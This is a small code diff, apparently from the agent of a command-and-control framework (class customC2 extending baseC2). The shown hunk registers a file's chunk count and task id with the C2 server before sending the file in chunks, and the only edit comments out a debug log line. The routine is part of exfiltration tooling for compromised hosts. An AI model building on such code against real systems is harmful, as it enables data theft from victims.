@@ -110,7 +110,7 @@ class customC2 extends baseC2{
             var registerData = JSON.stringify({'total_chunks': numOfChunks, 'task': task.id});
             var registerData = convert_to_nsdata(registerData);
             var registerFile = this.postResponse(task, registerData);
-            console.log("did the call to postresponse");
+            //console.log("did the call to postresponse");
             if (registerFile['status'] == "success"){
                 handle.seekToFileOffset(0);
                 var currentChunk = 1;
